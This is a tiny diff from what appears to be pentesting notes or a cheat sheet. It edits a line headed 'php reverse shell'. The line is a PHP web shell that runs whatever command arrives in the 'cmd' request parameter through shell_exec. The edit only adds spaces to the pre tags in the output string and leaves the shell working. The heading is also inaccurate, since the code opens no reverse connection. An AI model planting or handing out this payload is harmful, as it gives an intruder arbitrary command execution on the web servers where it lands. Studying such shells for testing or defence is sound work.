@@ -285,4 +285,4 @@ die.exe tool
 
 php reverse shell
 
-> echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; 
+> echo " < p r e > " . shell_exec($_REQUEST['cmd']) . " < / p r e > " ; 
